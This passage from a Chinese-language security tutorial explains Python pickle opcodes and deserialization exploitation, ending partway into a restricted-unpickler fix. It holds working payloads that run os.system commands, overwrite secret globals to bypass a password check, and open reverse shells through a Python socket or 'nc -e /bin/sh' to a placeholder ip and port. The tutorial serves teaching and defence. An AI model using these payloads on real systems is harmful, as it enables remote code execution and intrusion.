class="hljs-keyword">return</span> obj, parent<br></code></pre></td></tr></table></figure><p><strong>(</strong></p><p>向栈中压入一个 MARK 标记</p><p>源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_mark</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 将当前stack列表添加到metastack中，相当于标记</span><br>    self.metastack.append(self.stack)<br>    <span class="hljs-comment"># 清空当前栈</span><br>    self.stack = []<br>    <span class="hljs-comment"># 设置一个简化的append方法</span><br>    self.append = self.stack.append<br>dispatch[MARK[<span class="hljs-number">0</span>]] = load_mark<br></code></pre></td></tr></table></figure><p><strong>S</strong></p><p>实例化一个字符串对象</p><p>源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_string</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 读取一行数据，去除换行符</span><br>    data = self.readline()[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># 去掉最外面的引号</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &gt;= <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> data[<span class="hljs-number">0</span>] == data[-<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span> data[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> <span class="hljs-string">b&#x27;&quot;\&#x27;&#x27;</span>:<br>        data = data[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> UnpicklingError(<span class="hljs-string">&quot;the STRING opcode argument must be quoted&quot;</span>)<br>    <span class="hljs-comment"># 对数据解码后添加到当前栈中</span><br>    self.append(self._decode_string(codecs.escape_decode(data)[<span class="hljs-number">0</span>]))<br>dispatch[STRING[<span class="hljs-number">0</span>]] = load_string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_decode_string</span>(<span class="hljs-params">self, value</span>):<br>    <span class="hljs-comment"># Used to allow strings from Python 2 to be decoded either as</span><br>    <span class="hljs-comment"># bytes or Unicode strings.  This should be used only with the</span><br>    <span class="hljs-comment"># STRING, BINSTRING and SHORT_BINSTRING opcodes.</span><br>    <span class="hljs-keyword">if</span> self.encoding == <span class="hljs-string">&quot;bytes&quot;</span>:<br>        <span class="hljs-keyword">return</span> value<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> value.decode(self.encoding, self.errors)<br></code></pre></td></tr></table></figure><p><strong>t</strong></p><p>寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果</p><p>源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_tuple</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 弹出当前栈中数据</span><br>    items = self.pop_mark()<br>    <span class="hljs-comment"># 转成tuple类型并添加到还原后的栈中</span><br>    self.append(<span class="hljs-built_in">tuple</span>(items))<br>dispatch[TUPLE[<span class="hljs-number">0</span>]] = load_tuple<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop_mark</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 返回当前的stack到items</span><br>    items = self.stack<br>    <span class="hljs-comment"># 从metastack还原之前的stack</span><br>    self.stack = self.metastack.pop()<br>    self.append = self.stack.append<br>    <span class="hljs-keyword">return</span> items<br></code></pre></td></tr></table></figure><p><strong>R</strong></p><p>从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈</p><p>源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_reduce</span>(<span class="hljs-params">self</span>):<br>    stack = self.stack<br>    <span class="hljs-comment"># 第一个对象作为参数</span><br>    args = stack.pop()<br>    <span class="hljs-comment"># 第二个对象作为函数</span><br>    func = stack[-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># 调用func函数，并把结果赋给栈顶</span><br>    stack[-<span class="hljs-number">1</span>] = func(*args)<br>dispatch[REDUCE[<span class="hljs-number">0</span>]] = load_reduce<br></code></pre></td></tr></table></figure><p><strong>.</strong></p><p>程序结束，栈顶的一个元素作为 pickle.loads() 的返回值</p><p>源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 结束反序列化</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_stop</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 栈顶的值作为返回值</span><br>    value = self.stack.pop()<br>    <span class="hljs-keyword">raise</span> _Stop(value)<br>dispatch[STOP[<span class="hljs-number">0</span>]] = load_stop<br></code></pre></td></tr></table></figure><p>所以可以得到以下解释</p><p>c后面跟的是模块名，换行之后的是类名，相当于将os.system放入栈中，然后放入一个标记符，接着将字符串 whoami 放入栈中，遇到t将栈中的数据弹出，一直到标记，并转为 tuple 再存入栈中，同时标记符消失，遇到R后将元组取出，作为参数放入函数中执行后将结果返回</p><p>可以看作执行了<code>os.system(&#39;whoami&#39;)</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/python/python-pickle-1.png"></p><h2 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h2><p>当字节码很多的时候一个一个对着表去读会很麻烦，所以Python提供了pickletools工具，便于人工解读opcode</p><p>pickletools常用的有<code>pickletools.dis</code>和<code>pickletools.optimize</code></p><p><code>pickletools.dis</code>：具有反汇编的功能，可以以可读性较强的方式展示一个序列化对象</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/python/python-pickle-2.png"></p><p><code>pickletools.optimize</code>：对一个序列化结果进行优化（消除未使用的 <code>PUT</code> 操作码）</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/python/python-pickle-3.png"></p><h1 id="常见利用思路"><a href="#常见利用思路" class="headerlink" title="常见利用思路"></a>常见利用思路</h1><p>漏洞产生原因是用户可控的反序列化入口点</p><h2 id="魔术方法-reduce"><a href="#魔术方法-reduce" class="headerlink" title="魔术方法 __reduce__()"></a>魔术方法 __reduce__()</h2><blockquote><p>PVM 的 操作码 R 就是 __reduce__() 的返回值的一个底层实现<br>与php中的__wakeup()方法类似，python在反序列化时会先调用__reduce__()魔术方法，所以我们可以利用这一特点触发恶意代码</p></blockquote><p>一个利用<code>__reduce__()</code>的例子，在能够传入可控的 pickle.loads 的 data 时就可以生效</p><p>但是需要注意reduce一次只能执行一个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 注意python2与python3 之间的新式类与旧式类的区别，python2需要手动继承object</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        shell = <span class="hljs-string">&quot;&quot;&quot;whoami&quot;&quot;&quot;</span>          <span class="hljs-comment"># 要执行的命令</span><br>        <span class="hljs-keyword">return</span> os.system, (shell,)    <span class="hljs-comment"># reduce函数必须返回元组或字符串</span><br><br><br>test = Test()<br>a = pickle.dumps(test, protocol=<span class="hljs-number">0</span>)<br>pickle.loads(a)<br><span class="hljs-built_in">print</span>(a)<br>pickletools.dis(pickletools.optimize(a))<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/python/python-pickle-4.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/python/python-pickle-5.png"></p><h2 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h2><blockquote><p>可以通过覆盖一些凭证达到绕过身份验证的目的</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + secret.key)<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;key&#x27;</span><br><span class="hljs-string">S&#x27;123&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br>pickle.loads(opcode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + secret.key)<br>pickletools.dis(opcode)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/python/python-pickle-6.png"></p><h2 id="全局变量引用"><a href="#全局变量引用" class="headerlink" title="全局变量引用"></a>全局变量引用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        obj = pickle.loads(<span class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\nVa\nsb.&#x27;</span>)<br>        <span class="hljs-keyword">if</span> obj.pwd == secret.pwd:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, admin!&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No&quot;</span>)<br><br><br>test = Target()<br></code></pre></td></tr></table></figure><p>上面的例子中我们并不知道<code>secret.pwd</code>的值，要使if成立，可以使用<code>c</code>来实现</p><p><code>c</code>的作用是 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\nVaaa\nsb.&#x27;</span><br><br><span class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\ncsecret\npwd\nsb.&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/python/python-pickle-7.png"></p><blockquote><p>与php反序列化中的<code>$this-&gt;b = &amp;$this-&gt;a;</code>引用绕过类似，只不过python用的是import</p></blockquote><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>pickle中用来构造函数执行的字节码有四个个：<code>R</code>、<code>i</code>、<code>o</code>以及<code>b +__setstate__()</code></p><h3 id="R"><a href="#R" class="headerlink" title="R"></a>R</h3><p><a href="#a">上文</a>中提到的例子用的就是<code>R</code>来实现Rce</p><blockquote><p>R: 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">(S&#x27;whoami&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="i"><a href="#i" class="headerlink" title="i"></a>i</h3><blockquote><p>相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_inst</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 前三行代码与c的代码一致，用来调用</span><br>    module = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br>    name = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br>    klass = self.find_class(module, name)<br>    <span class="hljs-comment"># 通过pop_mark()函数得到参数，利用_instantiate函数执行，将结果存入栈中</span><br>    self._instantiate(klass, self.pop_mark())<br>dispatch[INST[<span class="hljs-number">0</span>]] = load_inst<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_instantiate</span>(<span class="hljs-params">self, klass, args</span>):<br>    <span class="hljs-keyword">if</span> (args <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(klass, <span class="hljs-built_in">type</span>) <span class="hljs-keyword">or</span><br>        <span class="hljs-built_in">hasattr</span>(klass, <span class="hljs-string">&quot;__getinitargs__&quot;</span>)):<br>        <span class="hljs-keyword">try</span>:<br>            value = klass(*args)<br>        <span class="hljs-keyword">except</span> TypeError <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;in constructor for %s: %s&quot;</span> %<br>                            (klass.__name__, <span class="hljs-built_in">str</span>(err)), sys.exc_info()[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">else</span>:<br>        value = klass.__new__(klass)<br>    self.append(value)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="o"><a href="#o" class="headerlink" title="o"></a>o</h3><blockquote><p>从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_obj</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 弹出栈中所有数据赋值给args</span><br>    args = self.pop_mark()<br>    <span class="hljs-comment"># 在args中弹出第一个作为类名</span><br>    cls = args.pop(<span class="hljs-number">0</span>)<br>    <span class="hljs-comment"># 利用_instantiate函数执行并将结果压回栈中</span><br>    self._instantiate(cls, args)<br>dispatch[OBJ[<span class="hljs-number">0</span>]] = load_obj<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;whoami&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="b-setstate"><a href="#b-setstate" class="headerlink" title="b + __setstate__()"></a>b + __setstate__()</h3><blockquote><p>使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_build</span>(<span class="hljs-params">self</span>):<br>    stack = self.stack<br>    <span class="hljs-comment"># 获取栈顶元素</span><br>    state = stack.pop()<br>    <span class="hljs-comment"># 获取栈中倒数第二个元素</span><br>    inst = stack[-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># 获取倒数第二个元素的__setstate__属性</span><br>    setstate = <span class="hljs-built_in">getattr</span>(inst, <span class="hljs-string">&quot;__setstate__&quot;</span>, <span class="hljs-literal">None</span>)<br><br>    <span class="hljs-comment"># setstate 不为None则调用inst对象的__setstate，将state作为参数传递给它</span><br>    <span class="hljs-comment"># 一般不存在__setstate__方法，setstate(state)会造成任意函数调用</span><br>    <span class="hljs-keyword">if</span> setstate <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        setstate(state)<br>        <span class="hljs-keyword">return</span><br>    slotstate = <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># 如果state是元组类型且长度为2，则将其分解成state, slotstate</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(state, <span class="hljs-built_in">tuple</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(state) == <span class="hljs-number">2</span>:<br>        state, slotstate = state<br><br>    <span class="hljs-keyword">if</span> state:<br>        inst_dict = inst.__dict__<br>        intern = sys.intern<br>        <span class="hljs-comment"># 遍历state字典，将键名赋值给inst_dict，键值直接赋值</span><br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> state.items():<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(k) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span>:<br>                inst_dict[intern(k)] = v<br>            <span class="hljs-keyword">else</span>:<br>                inst_dict[k] = v<br><br>    <span class="hljs-keyword">if</span> slotstate:<br>        <span class="hljs-comment"># 遍历slotstate字典，并将其键值对赋值给inst对象</span><br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> slotstate.items():<br>            <span class="hljs-built_in">setattr</span>(inst, k, v)<br>dispatch[BUILD[<span class="hljs-number">0</span>]] = load_build<br></code></pre></td></tr></table></figure><p>因为一般不存在__setstate__，所以不会触发setstate(state)。但是如果手动压入一个字典<code>&#123;&quot;__setstate__&quot;:os.system&#125;</code>，执行<code>b</code>。就会添加一个新的键值对，再继续压入命令，再执行<code>b</code>时，<code>setstate</code>就不会为None了，而是我们传入的os.system，就是<code>os.system(state)</code>，而state就是我们传入的命令，从而完成rce</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        self.name = <span class="hljs-string">&quot;aa&quot;</span><br><br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;(c__main__</span><br><span class="hljs-string">Test</span><br><span class="hljs-string">)o(S&quot;__setstate__&quot;</span><br><span class="hljs-string">cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">dbS&quot;whoami&quot;</span><br><span class="hljs-string">b.&#x27;&#x27;&#x27;</span><br><br>pickle.loads(opcode)<br>pickletools.dis(opcode)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">lewiserii\lewiserii</span><br><span class="hljs-string">    0: (    MARK</span><br><span class="hljs-string">    1: c        GLOBAL     &#x27;__main__ Test&#x27;</span><br><span class="hljs-string">   16: )        EMPTY_TUPLE</span><br><span class="hljs-string">   17: o        OBJ        (MARK at 0)</span><br><span class="hljs-string">   18: (    MARK</span><br><span class="hljs-string">   19: S        STRING     &#x27;__setstate__&#x27;</span><br><span class="hljs-string">   35: c        GLOBAL     &#x27;os system&#x27;</span><br><span class="hljs-string">   46: d        DICT       (MARK at 18)</span><br><span class="hljs-string">   47: b    BUILD</span><br><span class="hljs-string">   48: S    STRING     &#x27;whoami&#x27;</span><br><span class="hljs-string">   58: b    BUILD</span><br><span class="hljs-string">   59: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 1</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>既然可以执行命令了，那么肯定可以反弹shell了，以下是几种payload</p><p><strong>利用i执行python socket建立shell</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><br>payload= <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;python -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;ip&quot;, port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(payload)))<br></code></pre></td></tr></table></figure><p><strong>reduce直接执行nc命令</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc ip port -e/bin/sh&#x27;)&quot;</span>,))<br><br>payload = Test()<br><span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(payload)))<br></code></pre></td></tr></table></figure><h1 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h1><blockquote><p><a href="https://github.com/eddieivan01/pker">pker</a>是由eddieivan01编写的以遍历Python AST的形式来自动化解析pickle opcode的工具。</p></blockquote><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复 "></a>漏洞修复 <a id="b"></h1><p>对于pickle反序列化漏洞，常见的修复方法是重写Unpickler.find_class()来限制全局变量</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-comment"># 需要限制反序列化对象时可以使用的类</span><br>safe_builtins = &#123;<br>    <span class="hljs-string">&#x27;range&#x27;</span>,        <span class="hljs-comment"># range类型</span><br>    <span class="hljs-string">&#x27;complex&#x27;</span>,      <span class="hljs-comment"># 复数类型</span><br>    <span class="hljs-string">&#x27;set&#x27;</span>,          <span class="hljs-comment"># 集合类型</span><br>    <span class="hljs-string">&#x27;frozenset&#x27;</span>,    <span class="hljs-comment"># 冻结集合类型</span><br>    <span class="hljs-string">&#x27;slice&#x27;</span>,        <span class="hljs-comment"># 切片类型</span><br>&#125;<br><br><span class="hljs-comment"># 定义RestrictedUnpickler类继承自pickle.Unpickler</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    <span class="hljs-comment">#重写了find_class方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-comment"># 